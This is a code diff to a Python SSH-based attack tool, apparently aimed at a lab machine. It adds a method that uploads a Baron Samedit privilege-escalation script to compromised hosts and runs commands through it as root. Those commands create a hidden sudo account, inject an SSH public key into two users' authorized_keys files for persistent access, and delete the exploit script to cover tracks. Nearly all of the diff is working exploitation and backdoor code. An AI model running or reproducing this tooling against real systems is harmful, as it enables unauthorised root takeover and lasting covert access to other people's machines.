@@ -19,7 +19,7 @@ class UserIP:
 		"""
 		return f"{type(self).__name__}({self.ip_address})"
 
-	def __check_login(self, username, password, is_sudo_user, exploit_pwnkit=True):
+	def __check_login(self, username, password, is_sudo_user, exploit_pwnkit=False, exploit_baron_samedit=False):
 		"""
 		Returns True if we successfully got root, and returns False otherwise
 		"""
@@ -41,6 +41,8 @@ class UserIP:
 			got_root = True
 		elif exploit_pwnkit: # only attempt to exploit pwnkit if we're not already a sudo user
 			got_root = self.exploit_pwnkit(ssh_client=ssh_client, username=username)
+		elif exploit_baron_samedit:
+			got_root = self.exploit_baron_samedit(ssh_client=ssh_client, username=username)
 
 		ssh_client.close()
 		return got_root
@@ -104,6 +106,71 @@ class UserIP:
 			if ssh_stderr_text != "":
 				logger.error(ssh_stderr_text)
 			logger.info("Successfully cleaned up up pwnkit binary.")
+
+			ssh_client.close()
+
+			if output_as_string == "root":
+				logger.info(f"{COLOR_OKGREEN}Successfully got root on {username}@{self.ip_address}{COLOR_END}")
+				return True
+			else:
+				logger.info(f"{COLOR_FAIL}Failed to get root, the system does not seem to be vulnerable to pwnkit{COLOR_END}")
+				return False
+		except Exception as err:
+			logger.exception(err)
+			return False
+
+	def exploit_baron_samedit(self, ssh_client, username):
+		"""
+		Exploits baron samedit over an existing SSH connection
+		"""
+		try:
+			logger.info("Copying baron_samedit.py over SSH...")
+			sftp = ssh_client.open_sftp()
+			baron_samedit_script = "baron_samedit.py"
+			baron_samedit_script_destination_path = f"/home/{username}/{baron_samedit_script}"
+			sftp.put(localpath=f"./exploits/{baron_samedit_script}", remotepath=baron_samedit_script_destination_path, confirm=True)
+			logger.info(f"Successfully copied {baron_samedit_script} over SSH.")
+			sftp.close()
+
+			logger.info("Checking for root privileges...")
+			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'whoami' | python3 {baron_samedit_script}")
+			output_as_string = ssh_stdout.read().decode().strip()
+			ssh_stderr_text = ssh_stderr.read().decode().strip()
+			if ssh_stderr_text != "":
+				logger.error(ssh_stderr_text)
+			logger.debug(f"'whoami' output: {output_as_string}")
+
+			logger.info("Creating sudo user to log in as...")
+			useradd_command = "useradd -m josh -g sudo -s /bin/bash"
+			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{useradd_command}' | python3 {baron_samedit_script}")
+			ssh_stderr_text = ssh_stderr.read().decode().strip()
+			if ssh_stderr_text != "":
+				logger.error(ssh_stderr_text)
+			logger.info("Successfully created user to log in as.")
+
+			logger.info("Adding SSH key to elliot's authorized keys...")
+			add_ssh_key_command = f"grep -qxF \"{self.public_ssh_key_to_inject}\" /home/elliot/.ssh/authorized_keys || echo \"{self.public_ssh_key_to_inject}\" >> /home/elliot/.ssh/authorized_keys"
+			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{add_ssh_key_command}' | python3 {baron_samedit_script}")
+			ssh_stderr_text = ssh_stderr.read().decode().strip()
+			if ssh_stderr_text != "":
+				logger.error(ssh_stderr_text)
+			logger.info("Successfully added SSH key to elliot's authorized keys.")
+
+			logger.info("Adding SSH key to josh's authorized keys...")
+			# the following line is a little complex, first we create the .ssh directory if it doesn't exist, then check if our public SSH key is in the authorized keys, then we add it to the authorized keys if it is not already there
+			add_ssh_key_command = f"mkdir -p /home/josh/.ssh && grep -qxF \"{self.public_ssh_key_to_inject}\" /home/josh/.ssh/authorized_keys || echo \"{self.public_ssh_key_to_inject}\" >> /home/josh/.ssh/authorized_keys"
+			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{add_ssh_key_command}' | python3 {baron_samedit_script}")
+			ssh_stderr_text = ssh_stderr.read().decode().strip()
+			if ssh_stderr_text != "":
+				logger.error(ssh_stderr_text)
+			logger.info("Successfully added SSH key to josh's authorized keys.")
+
+			logger.info("Cleaning up baron_samedit script...")
+			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'rm {baron_samedit_script_destination_path}' | python3 {baron_samedit_script}")
+			ssh_stderr_text = ssh_stderr.read().decode().strip()
+			if ssh_stderr_text != "":
+				logger.error(ssh_stderr_text)
+			logger.info("Successfully cleaned up up baron_samedit script.")
 
 			ssh_client.close()
 
